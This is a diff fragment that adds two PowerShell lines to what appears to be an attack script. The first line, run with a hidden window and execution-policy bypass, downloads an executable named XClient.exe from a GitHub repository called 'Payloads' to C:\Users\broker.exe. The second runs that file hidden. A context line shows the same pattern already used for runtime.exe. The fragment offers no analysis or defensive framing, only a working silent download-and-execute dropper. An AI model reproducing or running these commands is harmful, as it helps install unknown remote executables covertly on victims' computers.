@@ -15,6 +15,10 @@ powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Pa
 powershell.exe -w Hidden C:\Users\runtime.exe
 
 
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/XClient.exe -o C:\Users\broker.exe
+powershell.exe -w Hidden C:\Users\broker.exe
+
+
 
 
 
